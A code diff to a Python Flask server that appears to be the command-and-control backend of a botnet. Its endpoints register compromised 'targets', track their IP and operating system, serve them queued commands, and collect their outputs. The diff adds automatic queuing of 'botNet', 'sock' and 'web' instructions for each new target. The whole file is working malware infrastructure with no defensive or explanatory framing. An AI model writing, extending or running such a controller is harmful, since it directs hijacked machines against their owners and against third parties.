@@ -5,7 +5,7 @@ from datetime import datetime
 from db.modle import APICommand,APILink,ApiToken,Instraction,Targets,BotNet
 from db.mange_db import config,_create_engine
 from utility.email_temp import email_temp
-from utility.processer import log,getlist,readFromJson,writeToJson
+from utility.processer import log,getlist,readFromJson,update_output,update_user_info,update_target_info
 
 emailTemplate = email_temp()
 
@@ -22,15 +22,22 @@ def apiCommand(target_name):
 
         try:
 
-            api_token = request.args('token')
-            IP = request.args('ip')
-            valid = getlist(_session.query(ApiToken).filter(token=api_token).all(),sp=',')
+            api_token = request.args.get('token')
+            IP = request.args.get('ip')
+            opreatingSystem = request.args.get('os')
+            valid = getlist(_session.query(ApiToken).filter_by(token=api_token).all(),sp=',')
 
             if valid:
-                apiCommand = getlist(_session.query(APICommand).filter_by(target_name=target_name,condition='0').all(),sp=',')
+                apiCommand = getlist(_session.query(APICommand).filter_by(
+                        target_name=target_name,
+                        condition=config.STUTAS[1]
+                    ).all(),
+                    sp=','
+                )
+                print(apiCommand)
                 if IP != readFromJson()['target-info'][target_name]['ip']:
                     data = readFromJson()['target-info'][target_name]
-                    writeToJson(data, 'ip',IP)
+                    update_target_info(target_name,IP,opreatingSystem)
                 return {'allCommand': apiCommand},200
             
             else:
@@ -61,16 +68,20 @@ def save_output():
             valid = getlist(_session.query(Targets).filter_by(target_name=target_name,token=token).all(),sp=',')
 
             if len(valid) != 0:
-                data = readFromJson()
                 outputs = request.json.get('output')
+                opreatingSystem = request.json.get('os')
 
                 for output in outputs:
-                    outputData = {output[0]: output[1]}
-                    writeToJson(data=data,section='output',info=outputData)
+                    update_output(target_name, output[0], output[1])
+                    _session.query(APICommand).filter_by(ID=output[0]).update(
+                        {
+                            'condition' : config.STUTAS[0],
+                        }
+                    )
+                    _session.commit()
 
                 if IP != readFromJson()['target-info'][target_name]['ip']:
-                    data = readFromJson()['target-info'][target_name]
-                    writeToJson(data, 'ip',IP)
+                    update_target_info(target_name,IP,opreatingSystem)
 
                 return {'message': 'Outputs were seved'},200
             
@@ -124,11 +135,16 @@ def registor_target():
                 target = Targets(target_name, valid[0][2].replace(' ',''), apitoken)
                 _session.add(target)
                 _session.commit()
-                data = {target_name: {
-                    'ip': IP,
-                    'os': opratingSystem
-                }}
-                writeToJson(readFromJson(), 'target-info',data)
+                update_target_info(target_name,IP,opratingSystem)
+
+                botNet = Instraction(config.ID(),300,target_name,config.INSTRACTION[2],config.STUTAS[1])
+                sock = Instraction(config.ID(),300,target_name,config.INSTRACTION[1],config.STUTAS[1])
+                web = Instraction(config.ID(),300,target_name,config.INSTRACTION[0],config.STUTAS[1])
+
+                _session.add(botNet)
+                _session.add(sock)
+                _session.add(web)
+                _session.commit()
 
                 return {'target_name': target_name}, 200  # Return 200 OK status
 
@@ -152,26 +168,28 @@ def instarction(target_name):
             print('i am the problame')
             token = request.args.get('token')
             IP = request.args.get('ip')
+            opratingSystem = request.args.get('os')
             print(token)
-            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(),sp=',')
+            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
 
             if len(valid) != 0:
 
-                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(),sp=',')
+                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
                 if len(instraction) != 0:
                     if IP != readFromJson()['target-info'][target_name]['ip']:
-                        data = readFromJson()['target-info'][target_name]
-                        writeToJson(data, 'ip',IP)
-
-                    return {'delay': instraction[0][1],'instraction': instraction[0][-1]},200
+                        data = readFromJson()['target-info'][target_name]['ip']
+                        print('updatinting ip',data)
+                        update_target_info(target_name,IP,opratingSystem)
+                    print('updatinting ip',readFromJson()['target-info'][target_name]['ip'],'ip',IP)
+                    return {'delay': instraction[0][1], 'instraction': instraction[0][3]}, 200
                 
-                return {'Message': 'No instraction found'},404
+                return {'Message': 'No instraction found'}, 404
             else:
-                return {'error': 'Invalid api token'},403
+                return {'error': 'Invalid api token'}, 403
             
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-            return {'Erorr': 'Invalid api_token or no api token provided'},404
+            return {'Erorr': f'Exception {str(e)}'}, 500
     else:
         return {'Error': "Unsupported method or didn't provid target name"},405
 
